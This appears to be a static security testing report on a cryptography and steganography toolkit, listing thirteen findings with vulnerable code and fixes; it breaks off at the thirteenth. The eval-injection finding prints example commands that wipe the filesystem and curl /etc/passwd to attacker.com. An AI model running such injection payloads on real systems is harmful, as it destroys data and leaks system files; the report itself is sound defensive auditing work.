# Static Application Security Testing (SAST) Report
## Data Privacy & Forensics Toolkit (DPFT)

---

| Field | Details |
| :--- | :--- |
| **Report Date** | 2026-06-26 |
| **Application** | Data Privacy & Forensics Toolkit (DPFT) v1.0.0 |
| **Repository** | `d:\data-privacy-toolkit` |
| **Assessment Basis** | Pre-SAST Codebase Assessment (`Pre-SAST.md`) |
| **Analyst Role** | Expert Application Security Analyst |
| **Assessment Type** | Static Application Security Testing (SAST) |
| **Scope** | Full source code — backend, frontend, CLI, algorithms |

---

## Vulnerability Severity Summary

| ID | Vulnerability | Severity | File | Status |
| :--- | :--- | :---: | :--- | :--- |
| SAST-01 | Dynamic Module Import — RCE / LFI | 🔴 **CRITICAL** | `backend/app.py` | Open |
| SAST-02 | Arbitrary Code Execution via `eval()` | 🔴 **CRITICAL** | `backend/cli.py` | Open |
| SAST-03 | Wildcard CORS + Complete Absence of Authentication | 🔴 **CRITICAL** | `backend/app.py` | Open |
| SAST-04 | Hardcoded Default Master Password | 🟠 **HIGH** | `backend/algorithms/key_vault.py` | Open |
| SAST-05 | Unvalidated File Upload — DoS / Resource Exhaustion | 🟠 **HIGH** | `stego_engine.py`, `watermark_engine.py` | Open |
| SAST-06 | Textbook RSA — Missing OAEP Padding | 🟠 **HIGH** | `backend/algorithms/rsa_cipher.py` | Open |
| SAST-07 | Custom ECC / ECDSA — Timing & Side-Channel Attacks | 🟡 **MEDIUM** | `ecc_cipher.py`, `ecdsa_cipher.py`, `ecdh_cipher.py` | Open |
| SAST-08 | XSS via `alert()` — Reflected Decoded Payload | 🟡 **MEDIUM** | `frontend/js/api.js` | Open |
| SAST-09 | No Rate Limiting — API Abuse & Brute-Force | 🟡 **MEDIUM** | `backend/app.py` | Open |
| SAST-10 | No Security Logging or Audit Trail | 🔵 **LOW** | Application-wide | Open |
| SAST-11 | Hardcoded Public API URL in Client Source | 🔵 **LOW** | `frontend/js/api.js` | Open |
| SAST-12 | Phantom Session Token in Frontend HTML | 🔵 **LOW** | `frontend/index.html` | Open |
| SAST-13 | AES-GCM Nonce Length Discrepancy | 🔵 **LOW** | `backend/algorithms/aes_cipher.py` | Open |

---

## Detailed Findings

---

### SAST-01 — Dynamic Module Import: Remote Code Execution / Local File Inclusion

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🔴 CRITICAL |
| **CWE** | CWE-94: Improper Control of Generation of Code, CWE-22: Path Traversal |
| **CVSS v3.1 Score** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **File** | [`backend/app.py`](file:///d:/data-privacy-toolkit/backend/app.py) |
| **Lines** | 59–61 |

#### Vulnerable Code

```python
# backend/app.py — Lines 59–61
module_path = f"backend.algorithms.{algorithm}_cipher"
try:
    module = importlib.import_module(module_path)
```

#### Description

The `algorithm` parameter is extracted directly from the HTTP URL path (`/api/crypto/{action}/{algorithm}`) and concatenated without sanitization into a module path string. This string is then passed to `importlib.import_module()`.

**Attack Scenario — Local File Inclusion (LFI):** An attacker sends:
```
POST /api/crypto/encrypt/../../os
```
Python's module resolution may translate this into an import of `os`, `sys`, or any accessible module on the Python path, causing unintended module execution and information disclosure.

**Attack Scenario — Logic Bypass:** An attacker supplies a known internal module name to trigger execution of that module's top-level code or class constructors with side effects.

**Attack Scenario — Dependency Confusion:** If new packages are installed on the host, an attacker can invoke imported modules that were not intended to be accessible via the API surface.

While the `ImportError` catch provides a partial barrier, it does not prevent traversal to other valid packages or standard library modules. The absence of an explicit allowlist means the only enforcement is Python's own import resolution.

#### Remediation

**Step 1 — Implement a strict string allowlist before any dynamic import.**

```python
# backend/app.py — Secure implementation
ALLOWED_ALGORITHMS = frozenset({
    "aes", "blowfish", "cellular_automata", "chacha20", "des",
    "diffie_hellman", "ecc", "ecdh", "ecdsa", "elgamal", "enigma",
    "hmac_auth", "key_vault", "lfsr", "lucifer", "monoalphabetic",
    "nlfsr", "password_hasher", "pgp", "polyalphabetic", "rabin",
    "rc4", "rsa", "salsa20", "seal", "sha3_hasher", "transposition"
})

@app.post("/api/crypto/{action}/{algorithm}", response_model=CipherResponse)
async def dynamic_crypto_handler(action: str, algorithm: str, request: CipherRequest):
    # Validate action
    if action not in ("encrypt", "decrypt"):
        raise HTTPException(status_code=400, detail="Invalid action.")

    # Validate algorithm against strict allowlist BEFORE any import
    if algorithm not in ALLOWED_ALGORITHMS:
        raise HTTPException(status_code=404, detail=f"Algorithm '{algorithm}' not found.")

    module_path = f"backend.algorithms.{algorithm}_cipher"
    module = importlib.import_module(module_path)
    # ... rest of handler
```

**Step 2 (Preferred) — Replace dynamic loading with the existing `CipherFactory` registry.**

The `CipherFactory` in [`backend/algorithms/factory.py`](file:///d:/data-privacy-toolkit/backend/algorithms/factory.py) already implements a safe dictionary-based registry. The API handler should delegate to it directly, eliminating dynamic imports entirely:

```python
from backend.algorithms.factory import CipherFactory

@app.post("/api/crypto/{action}/{algorithm}", response_model=CipherResponse)
async def dynamic_crypto_handler(action: str, algorithm: str, request: CipherRequest):
    if action not in ("encrypt", "decrypt"):
        raise HTTPException(status_code=400, detail="Invalid action.")
    try:
        cipher = CipherFactory.create(algorithm)  # Raises ValueError if unknown
    except ValueError:
        raise HTTPException(status_code=404, detail=f"Algorithm '{algorithm}' not found.")
    # ... dispatch to cipher.encrypt / cipher.decrypt
```

---

### SAST-02 — Arbitrary Code Execution via `eval()`

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🔴 CRITICAL |
| **CWE** | CWE-78: OS Command Injection / CWE-94: Code Injection |
| **CVSS v3.1 Score** | 9.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **File** | [`backend/cli.py`](file:///d:/data-privacy-toolkit/backend/cli.py) |
| **Lines** | 92, 127 |

#### Vulnerable Code

```python
# backend/cli.py — Line 92 (run_encrypt function)
peer_pub = eval(data)  # data is directly the CLI argument value

# backend/cli.py — Line 127 (run_decrypt function)
priv_key = eval(key) if "(" in key else int(key)  # key is directly the CLI argument value
```

#### Description

Python's `eval()` executes any valid Python expression passed to it. Both vulnerable lines pass user-supplied CLI argument strings directly to `eval()` with no sanitization, allowlisting, or sandboxing.

**Attack Scenario — Arbitrary Code Execution:**
```bash
python -m backend.cli encrypt ECDH \
  "__import__('os').system('rm -rf /')" \
  --key "some_key"
```
The expression `__import__('os').system('rm -rf /')` would be evaluated and executed with full operating system privileges.

**Attack Scenario — Data Exfiltration:**
```bash
python -m backend.cli decrypt RSA "ciphertext" \
  --key "(__import__('subprocess').check_output(['curl', 'http://attacker.com/?d=$(cat /etc/passwd)']))"
```

Although the CVSS score reflects local attack vector (the CLI requires local access), in any CI/CD pipeline or automation context where CLI inputs originate from external sources (e.g., webhook payloads, build scripts), the attack vector becomes effectively network-level.

#### Remediation

**Replace `eval()` with type-safe parsers for all cases:**

```python
# backend/cli.py — Secure implementation for run_encrypt
import ast
import re

def _safe_parse_tuple(value: str) -> tuple:
    """Safely parses a string representation of a 2-element integer tuple."""
    # Only allow the pattern: (integer, integer)
    pattern = r'^\(\s*(\d+)\s*,\s*(\d+)\s*\)$'
    match = re.match(pattern, value.strip())
    if not match:
        raise ValueError(f"Invalid tuple format. Expected '(int, int)', got: '{value}'")
    return (int(match.group(1)), int(match.group(2)))

def run_encrypt(cipher, algo, data, key, args):
    if algo == "ECDH":
        # BEFORE: peer_pub = eval(data)
        peer_pub = _safe_parse_tuple(data)  # AFTER: strict regex parsing
        return cipher.compute_shared_secret(int(key), peer_pub)
    # ... rest of function

def run_decrypt(cipher, algo, data, key, args):
    if algo in ["RSA", "Rabin", "ElGamal"]:
        # BEFORE: priv_key = eval(key) if "(" in key else int(key)
        if "(" in key:
            priv_key = _safe_parse_tuple(key)  # AFTER: strict regex parsing
        else:
            try:
                priv_key = int(key)
            except ValueError:
                raise ValueError(f"Invalid private key format: '{key}'")
    # ... rest of function
```

---

### SAST-03 — Wildcard CORS Configuration and Complete Absence of Authentication

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🔴 CRITICAL |
| **CWE** | CWE-942: Permissive Cross-domain Policy / CWE-306: Missing Authentication |
| **CVSS v3.1 Score** | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| **File** | [`backend/app.py`](file:///d:/data-privacy-toolkit/backend/app.py) |
| **Lines** | 14–20 |

#### Vulnerable Code

```python
# backend/app.py — Lines 14–20
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],       # ANY origin is allowed
    allow_credentials=True,    # Credentials sent with cross-origin requests
    allow_methods=["*"],       # ALL HTTP methods permitted
    allow_headers=[\"*\"],       # ALL headers permitted
)
```

#### Description

This configuration has two compounding problems:

**Problem 1 — Contradictory CORS Policy:** The combination of `allow_origins=["*"]` and `allow_credentials=True` is a standard browser security violation. Browsers will **refuse** to process such responses when credentials (cookies, Authorization headers) are included. This means the configuration simultaneously breaks legitimate browser functionality and signals a fundamental misunderstanding of the CORS security model.

**Problem 2 — Zero Authentication / Authorization:** No endpoint in the API requires any form of identity verification. Any anonymous actor on the internet (when the application is deployed to Render, as evidenced by the hardcoded Render URL in `api.js`) can:
- Submit unlimited cryptographic operations.
- Encode arbitrary payloads into images and download the results.
- Decode images to extract potentially sensitive steganographic payloads.
- Watermark organizational documents without restriction.

There are no API keys, JWT tokens, session checks, OAuth flows, or role-based guards on any route.

#### Remediation

**Fix 1 — Correct CORS Policy (Least Privilege):**

```python
# backend/app.py — Secure CORS configuration
ALLOWED_ORIGINS = [
    "http://localhost:5500",        # Local dev server
    "http://127.0.0.1:5500",
    "https://your-production-domain.com",  # Explicit production origin
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,    # Explicit allowlist — never "*"
    allow_credentials=False,          # Only True if cookies are genuinely required
    allow_methods=["POST"],           # Only the methods the API actually uses
    allow_headers=["Content-Type"],   # Only required headers
)
```

**Fix 2 — Add API Key Authentication (Minimum Viable Control):**

```python
# backend/auth.py — Simple API key middleware
from fastapi import Security, HTTPException
from fastapi.security.api_key import APIKeyHeader
import os, secrets

API_KEY_HEADER = APIKeyHeader(name="X-API-Key", auto_error=True)
VALID_API_KEY = os.environ.get("DPFT_API_KEY")  # Set via environment variable

async def require_api_key(api_key: str = Security(API_KEY_HEADER)):
    if not VALID_API_KEY or not secrets.compare_digest(api_key, VALID_API_KEY):
        raise HTTPException(status_code=403, detail="Forbidden: Invalid API Key.")
    return api_key

# In app.py — Add dependency to all routes
@app.post("/api/crypto/{action}/{algorithm}", dependencies=[Depends(require_api_key)])
async def dynamic_crypto_handler(...):
    ...
```

---

### SAST-04 — Hardcoded Default Master Password in Key Vault

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🟠 HIGH |
| **CWE** | CWE-259: Use of Hard-coded Password |
| **CVSS v3.1 Score** | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **File** | [`backend/algorithms/key_vault.py`](file:///d:/data-privacy-toolkit/backend/algorithms/key_vault.py) |
| **Lines** | 20 |

#### Vulnerable Code

```python
# backend/algorithms/key_vault.py — Line 20
def __init__(self, vault_path: str = "vault.json", master_password: str = "default_pwd") -> None:
```

#### Description

The `KeyVault` class constructor defaults the master password to the literal string `"default_pwd"`. Any instance of `KeyVault` that is created without explicitly overriding this parameter will use this publicly-known, trivially guessable password to derive the AES-256 vault encryption key via scrypt.

The vault derives its 32-byte AES key from this master password using scrypt with conservative parameters (`N=16384`). If the `vault.json` file is leaked (e.g., included in a repository commit or read via a directory traversal), an attacker who knows the hardcoded password (which is visible in the source code) can immediately decrypt all stored keys without any brute-force effort.

Furthermore, `vault_path` also defaults to `"vault.json"` — a relative path resolved from the process working directory — which creates a predictable location for the vault file.

#### Remediation

```python
# backend/algorithms/key_vault.py — Secure implementation
import os

class KeyVault:
    def __init__(self, vault_path: str = None, master_password: str = None) -> None:
        # Require the master password from environment — never hardcode
        if master_password is None:
            master_password = os.environ.get("DPFT_VAULT_PASSWORD")
        if not master_password:
            raise ValueError(
                "KeyVault master password must be supplied via the "
                "DPFT_VAULT_PASSWORD environment variable. "
                "No default password is permitted."
            )

        # Use an absolute, configurable vault path
        if vault_path is None:
            vault_path = os.environ.get(
                "DPFT_VAULT_PATH",
                os.path.join(os.path.expanduser("~"), ".dpft", "vault.json")
            )

        self.vault_path = vault_path
        self.master_password = master_password
        # ... rest of __init__
```

Additionally, add `vault.json` and `*.vault` patterns to `.gitignore` to prevent accidental repository commits.

---

### SAST-05 — Unvalidated File Upload: Denial of Service / Resource Exhaustion

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🟠 HIGH |
| **CWE** | CWE-400: Uncontrolled Resource Consumption / CWE-434: Unrestricted Upload |
| **CVSS v3.1 Score** | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H) |
| **Files** | [`backend/app.py`](file:///d:/data-privacy-toolkit/backend/app.py) L125, L143, L162, L181; [`backend/steganography/stego_engine.py`](file:///d:/data-privacy-toolkit/backend/steganography/stego_engine.py); [`backend/watermarking/watermark_engine.py`](file:///d:/data-privacy-toolkit/backend/watermarking/watermark_engine.py) |

#### Vulnerable Code

```python
# backend/app.py — Lines 125, 143, 162, 181 (all upload handlers)
image_bytes = await file.read()   # No size limit — reads entire file into memory
pdf_bytes = await file.read()     # No size limit — reads entire file into memory

# backend/steganography/stego_engine.py — Line 57
img = Image.open(io.BytesIO(image_bytes))  # No content-type validation

# backend/watermarking/watermark_engine.py — Line 94
reader = PdfReader(io.BytesIO(pdf_bytes))  # No content-type validation, no page count limit
```

#### Description

All four upload endpoints (`/api/stego/encode`, `/api/stego/decode`, `/api/watermark/image`, `/api/watermark/pdf`) call `await file.read()` with no maximum size constraint, loading the entire file into RAM before any processing occurs.

**Attack Vector 1 — Memory Exhaustion:** An attacker uploads a 2 GB binary blob to any of these endpoints. The ASGI server buffers the full payload into a `bytes` object on the Python heap, exhausting available RAM and crashing the Uvicorn worker.

**Attack Vector 2 — Decompression Bomb (Image):** Certain PNG files with extreme compression ratios can decompress into gigabytes of pixel data. `Image.open()` and `img.getdata()` in `stego_engine.py` will materialize the full decompressed pixel array, causing unbounded memory usage.

**Attack Vector 3 — Malformed PDF Processing:** The `PdfReader()` in `watermark_engine.py` processes PDFs with no page limit. A PDF with thousands of pages triggers thousands of `merge_page()` calls and canvas compositing operations, consuming CPU and memory proportionally.

**Attack Vector 4 — MIME Type Spoofing:** Neither engine validates that the uploaded file's content actually matches the expected format. Uploading a `multipart/form-data` field labeled as `image/png` containing an ELF binary or shell script would be opened by `Image.open()`, potentially triggering parser vulnerabilities in Pillow.

The frontend HTML contains the comment `Maximum file size: 20MB` but no enforcement exists in the backend.

#### Remediation

```python
# backend/app.py — Add a reusable file validator
import magic  # python-magic library for MIME detection

MAX_IMAGE_SIZE = 10 * 1024 * 1024   # 10 MB
MAX_PDF_SIZE   = 25 * 1024 * 1024   # 25 MB
ALLOWED_IMAGE_TYPES = {"image/png", "image/jpeg", "image/gif", "image/webp"}
ALLOWED_PDF_TYPES   = {"application/pdf"}

async def read_validated_file(
    file: UploadFile,
    max_size: int,
    allowed_types: set[str]
) -> bytes:
    """Read and validate an uploaded file by size and content-based MIME type."""
    data = await file.read(max_size + 1)  # Read one byte over limit to detect oversized files
    if len(data) > max_size:
        raise HTTPException(
            status_code=413,
            detail=f"File too large. Maximum allowed size is {max_size // (1024*1024)} MB."
        )
    # Content-based MIME detection (not trusting Content-Type header)
    detected_type = magic.from_buffer(data, mime=True)
    if detected_type not in allowed_types:
        raise HTTPException(
            status_code=415,
            detail=f"Unsupported media type: '{detected_type}'. "
                   f"Allowed types: {allowed_types}"
        )
    return data

@app.post("/api/stego/encode")
async def stego_encode(file: UploadFile = File(...), secret_text: str = Form(...)):
    image_bytes = await read_validated_file(file, MAX_IMAGE_SIZE, ALLOWED_IMAGE_TYPES)
    output_bytes = SteganographyEngine.encode(image_bytes, secret_text)
    return Response(content=output_bytes, media_type="image/png")
```

Also add `python-magic` to `requirements.txt` and a corresponding `libmagic` system dependency note.

---

### SAST-06 — Textbook RSA Without OAEP Padding

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🟠 HIGH |
| **CWE** | CWE-327: Use of Broken or Risky Cryptographic Algorithm |
| **CVSS v3.1 Score** | 7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| **File** | [`backend/algorithms/rsa_cipher.py`](file:///d:/data-privacy-toolkit/backend/algorithms/rsa_cipher.py) |
| **Lines** | 6–12, 86–109, 111–127 |

#### Vulnerable Code

```python
# backend/algorithms/rsa_cipher.py — Lines 86–108
def encrypt(self, plaintext: str, public_key: Tuple[int, int]) -> str:
    """...
    Disclaimer: This implementation is "Textbook RSA" and lacks OAEP padding.
    """
    n, e = public_key
    data = plaintext.encode("utf-8")
    m = int.from_bytes(data, "big")  # Direct integer conversion — no padding
    if m >= n:
        raise ValueError("Payload exceeds RSA block limit (modulus n).")
    c = pow(m, e, n)                  # Raw modular exponentiation — deterministic
    c_bytes = c.to_bytes((c.bit_length() + 7) // 8, "big")
    return base64.b64encode(c_bytes).decode("utf-8")
```

#### Description

This implementation is acknowledged in its own docstring as "Textbook RSA." It operates without any padding scheme, making it vulnerable to several well-documented attacks:

**Vulnerability 1 — Deterministic Encryption (Chosen-Plaintext Attack):** Textbook RSA is deterministic — encrypting the same plaintext with the same key always produces the same ciphertext. An attacker can build a dictionary of known plaintext-ciphertext pairs and compare against intercepted ciphertexts to confirm plaintext content.

**Vulnerability 2 — Homomorphic Malleability:** For ciphertexts `c₁ = m₁ᵉ mod n` and `c₂ = m₂ᵉ mod n`, the product `c₁ × c₂ mod n` decrypts to `m₁ × m₂ mod n`. An attacker can create new valid ciphertexts without knowledge of the private key.

**Vulnerability 3 — Small Message Attacks:** For messages where `mᵉ < n`, the ciphertext does not "wrap around" modulo n, meaning `c = mᵉ` exactly. Taking the e-th root of `c` directly recovers `m` with no key needed.

**Vulnerability 4 — Broadcast Attack (Håstad):** If the same small plaintext is encrypted to multiple parties using the same public exponent `e=65537`, the Chinese Remainder Theorem can be used to recover the plaintext.

#### Remediation

**Replace the custom RSA implementation with `PyCryptodome`'s OAEP-padded RSA:**

```python
# backend/algorithms/rsa_cipher.py — Secure implementation
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
import base64

class RSACipher:
    """RSA encryption using RSA-OAEP with SHA-256 (production-safe)."""

    @classmethod
    def generate_keypair(cls, keysize: int = 2048):
        key = RSA.generate(keysize)
        return key.export_key(), key.publickey().export_key()

    def encrypt(self, plaintext: str, public_key_pem: bytes) -> str:
        pub_key = RSA.import_key(public_key_pem)
        cipher = PKCS1_OAEP.new(pub_key, hashAlgo=SHA256)
        ciphertext = cipher.encrypt(plaintext.encode("utf-8"))
        return base64.b64encode(ciphertext).decode("utf-8")

    def decrypt(self, ciphertext_b64: str, private_key_pem: bytes) -> str:
        priv_key = RSA.import_key(private_key_pem)
        cipher = PKCS1_OAEP.new(priv_key, hashAlgo=SHA256)
        ciphertext = base64.b64decode(ciphertext_b64)
        return cipher.decrypt(ciphertext).decode("utf-8")
```

If the custom implementation must be retained for educational purposes, **it must be explicitly blocked from the HTTP API** — accessible only from within controlled test or documentation contexts.

---

### SAST-07 — Custom ECC / ECDSA Implementations: Timing & Side-Channel Attacks

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🟡 MEDIUM |
| **CWE** | CWE-385: Covert Timing Channel / CWE-327: Risky Cryptographic Algorithm |
| **CVSS v3.1 Score** | 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **Files** | [`backend/algorithms/ecc_cipher.py`](file:///d:/data-privacy-toolkit/backend/algorithms/ecc_cipher.py), [`backend/algorithms/ecdh_cipher.py`](file:///d:/data-privacy-toolkit/backend/algorithms/ecdh_cipher.py), [`backend/algorithms/ecdsa_cipher.py`](file:///d:/data-privacy-toolkit/backend/algorithms/ecdsa_cipher.py) |

#### Vulnerable Code

```python
# backend/algorithms/ecc_cipher.py — Lines 99–103 (Double-and-Add scalar multiplication)
while k > 0:
    if k & 1:                          # Branches on secret key bits
        result = cls._add_points(result, addend)  # Timing differs between branches
    addend = cls._add_points(addend, addend)
    k >>= 1

# backend/algorithms/ecdsa_cipher.py — Lines 130–131 (Non-deterministic nonce k)
while True:
    k = secrets.randbelow(self.N - 1) + 1  # Random nonce — not deterministic (RFC 6979)
```

#### Description

**Vulnerability 1 — Timing Side-Channel in Scalar Multiplication:** The "Double-and-Add" algorithm at the core of all three ECC implementations executes a conditional point addition only when the current scalar bit is `1`. This means the execution time is not constant — it varies based on the number of `1` bits in the private key scalar. An attacker with timing measurement capability (e.g., through a remote timing oracle or local process measurements) can recover private key bits through statistical analysis.

**Vulnerability 2 — Non-Deterministic ECDSA Nonce (ECDSA-specific):** The ECDSA `sign()` method uses a random nonce `k` per signature. If the random number generator ever produces a repeated nonce for any two signatures, the private key is algebraically recoverable from those two signatures using simple arithmetic. This is the exact vulnerability that compromised the Sony PlayStation 3's firmware signing key. RFC 6979 defines a deterministic nonce generation scheme that eliminates this risk.

**Vulnerability 3 — Raw Python Arithmetic:** Python's `pow()`, `%`, and integer arithmetic operations are not constant-time. Any Python implementation of modular inverse or point addition will leak timing information through cache behavior and variable-length big integer operations.

#### Remediation

**Replace all custom ECC with PyCryptodome or the `cryptography` library:**

```python
# Secure replacement using the 'cryptography' library (preferred)
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature, decode_dss_signature
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

class ECDSACipher:
    """ECDSA signing using P-256 curve — constant-time, RFC 6979 deterministic nonce."""

    def generate_keypair(self):
        private_key = ec.generate_private_key(ec.SECP256K1(), default_backend())
        return private_key, private_key.public_key()

    def sign(self, message: str, private_key) -> bytes:
        """Sign using deterministic RFC 6979 nonce — immune to nonce-reuse attacks."""
        return private_key.sign(message.encode(), ec.ECDSA(hashes.SHA256()))

    def verify(self, message: str, signature: bytes, public_key) -> bool:
        try:
            public_key.verify(signature, message.encode(), ec.ECDSA(hashes.SHA256()))
            return True
        except Exception:
            return False
```

If custom implementations are retained for educational display, add explicit runtime guards to **prevent these classes from being callable via the live API**.

---

### SAST-08 — Reflected XSS via `alert()` with Unencoded Server Response

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🟡 MEDIUM |
| **CWE** | CWE-79: Cross-Site Scripting (XSS) |
| **CVSS v3.1 Score** | 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |
| **File** | [`frontend/js/api.js`](file:///d:/data-privacy-toolkit/frontend/js/api.js) |
| **Lines** | 54 |

#### Vulnerable Code

```javascript
// frontend/js/api.js — Line 54
alert(`DECRYPTED_PAYLOAD: ${data.secret_text}`);
```

#### Description

The steganography decode response from the server (`data.secret_text`) is embedded directly into a browser `alert()` dialog without any encoding or sanitization. While `alert()` itself does not render HTML, the raw server content is:

1. **Displayed to the user verbatim** — any `<script>` tags or XSS payloads encoded within a steganographic image would be surfaced as plaintext in the dialog, potentially confusing or misleading the user.
2. **A stepping stone to DOM-based XSS** — if a future developer refactors this line to use `innerHTML` or `document.write()` instead of `alert()`, the unencoded data becomes a direct XSS vector.

Additionally, the toast notification system (Lines 91–96 in `api.js`) injects `message` directly into `innerHTML` via the `<p>` element's text content — however the Tailwind class string injection nearby (`${borderColor}`, `${textColor}`) and the message field are set via `innerText`-equivalent patterns, reducing that specific risk.

#### Remediation

```javascript
// frontend/js/api.js — Secure implementation
if (endpoint === 'stego/decode') {
    const data = await response.json();
    this.showToast("DECODING_COMPLETE", "success");

    // Use a dedicated modal instead of alert()
    // Encode the output and display in a read-only, sandboxed element
    const modal = document.getElementById('output-modal');
    const outputEl = document.getElementById('output-modal-text');
    if (modal && outputEl) {
        outputEl.textContent = data.secret_text;  // textContent prevents XSS
        modal.style.display = 'flex';
    } else {
        // Fallback: safe read-only textarea
        const output = document.getElementById('output-data');
        if (output) output.value = data.secret_text;
    }
}
```

Never use `alert()` to display server-side data in a production application. Use sandboxed modal components with `textContent` assignment.

---

### SAST-09 — No Rate Limiting: API Abuse & Brute-Force Exposure

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🟡 MEDIUM |
| **CWE** | CWE-307: Improper Restriction of Excessive Authentication Attempts |
| **CVSS v3.1 Score** | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L) |
| **File** | [`backend/app.py`](file:///d:/data-privacy-toolkit/backend/app.py) |
| **Lines** | Application-wide |

#### Description

The FastAPI application applies no rate limiting middleware on any endpoint. Given that:

- All endpoints are publicly accessible (no authentication).
- Cryptographic operations — especially KDF-based primitives like Scrypt and PBKDF2 in `PasswordHasher` — are computationally expensive.
- The steganography and watermarking engines decode large binary payloads entirely in RAM.

An unauthenticated attacker can launch:
- **CPU exhaustion attacks** by flooding `/api/crypto/encrypt/password_hasher` with scrypt operations.
- **Memory exhaustion attacks** by flooding file upload endpoints with maximum-size files.
- **API abuse** by using the public server as a free cryptographic oracle for their own purposes.

#### Remediation

**Option 1 — SlowAPI (FastAPI-native rate limiting):**

```python
# backend/app.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/api/crypto/{action}/{algorithm}")
@limiter.limit("30/minute")  # 30 requests per IP per minute
async def dynamic_crypto_handler(request: Request, action: str, algorithm: str, ...):
    ...

@app.post("/api/stego/encode")
@limiter.limit("10/minute")  # Lower limit for expensive file operations
async def stego_encode(request: Request, ...):
    ...
```

**Option 2 — Reverse proxy rate limiting (Production):** Configure rate limiting at the Nginx/Caddy/Cloudflare layer before requests reach the Uvicorn application server.

---

### SAST-10 — No Security Logging or Audit Trail

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🔵 LOW |
| **CWE** | CWE-778: Insufficient Logging |
| **CVSS v3.1 Score** | 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L) |
| **File** | Application-wide |

#### Description

The application contains no structured logging beyond `run.py`'s startup print statement. No security-relevant events are logged, including:

- Failed algorithm lookups (potential reconnaissance indicator).
- Large file uploads (potential DoS indicator).
- Invalid action parameters (potential fuzzing indicator).
- Exception stack traces are propagated in `detail` fields of HTTP 400 responses (information leakage).

The bare `except Exception as e: raise HTTPException(status_code=400, detail=f"Operation failed: {str(e)}")` pattern in `app.py` line 109–110 leaks internal exception messages, stack trace fragments, and potentially sensitive variable names to API callers.

#### Remediation

```python
# backend/app.py — Add structured logging
import logging

logger = logging.getLogger("dpft.security")
logging.basicConfig(level=logging.INFO)

# In dynamic_crypto_handler:
except ImportError:
    logger.warning("ALGORITHM_NOT_FOUND", extra={"algorithm": algorithm, "ip": request.client.host})
    raise HTTPException(status_code=404, detail="Algorithm not found.")  # No internal details

except Exception as e:
    logger.error("OPERATION_FAILED", extra={"algorithm": algorithm, "error_type": type(e).__name__})
    # Return generic error — never propagate internal exception messages
    raise HTTPException(status_code=400, detail="The requested operation could not be completed.")
```

---

### SAST-11 — Hardcoded Production API URL in Client Source

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🔵 LOW |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |
| **CVSS v3.1 Score** | 3.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N) |
| **File** | [`frontend/js/api.js`](file:///d:/data-privacy-toolkit/frontend/js/api.js) |
| **Lines** | 6 |

#### Vulnerable Code

```javascript
// frontend/js/api.js — Line 6
const API_BASE = 'https://dataprivacy-6bmq.onrender.com/api';
```

#### Description

The production backend URL is hardcoded directly in the JavaScript source. This:

- Exposes the production endpoint to anyone reading the source code.
- Makes environment switching (local → staging → production) impossible without editing source files.
- Prevents the frontend from working correctly with a local backend instance unless the source is manually changed.

The README correctly references `http://localhost:8000` but the code points to the cloud deployment, creating a configuration inconsistency.

#### Remediation

```javascript
// frontend/js/api.js — Environment-aware configuration
const API_BASE = window.DPFT_API_BASE
    || (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
        ? `http://${window.location.hostname}:8000/api`
        : '/api');  // Relative URL for same-origin production deployments
```

Or use a build-time environment configuration file if a build toolchain is adopted.

---

### SAST-12 — Phantom Session Token Displayed in Frontend HTML

| Attribute | Detail |
| :--- | :--- |
| **Severity** | 🔵 LOW |
| **CWE** | CWE-200: Exposure of Sensitive Information |
| **CVSS v3.1 Score** | 2.3 (AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N) |
| **File** | [`frontend/index.html`](file:///d:/data-privacy-toolkit/frontend/index.html) |
| **Lines** | 156 |

#### Vulnerable Code

```html
<!-- frontend/index.html — Line 156 -->
<span class="whitespace-nowrap">SESSION_TOKEN: 8xFD-2200-LL91</span>
```

#### Description

A hardcoded string `8xFD-2200-LL91` is displayed in the footer status bar as a "session token." No actual session management system exists on the backend. However, this creates two risks:

1. **User Confusion:** A naive user or auditor may interpret this as a real session token, creating false confidence in a security control that does not exist.
2. **Social Engineering:** If an attacker social-engineers a victim by sharing a screenshot of the UI, the presence of an official-looking session token lends credibility to the deception.

#### Remediation

Remove the hardcoded token from the HTML. Replace with dynamic operational status text or remove the field entirely:

```html
<!-- frontend/index.html — Corrected -->
<span class="whitespace-nowrap">SESSION: STATELESS_MODE</span>
```

---

### SAST-13 — AES-GCM Nonce Length Discrepancy

| Attribute | Detail |
| :--- | :--- |
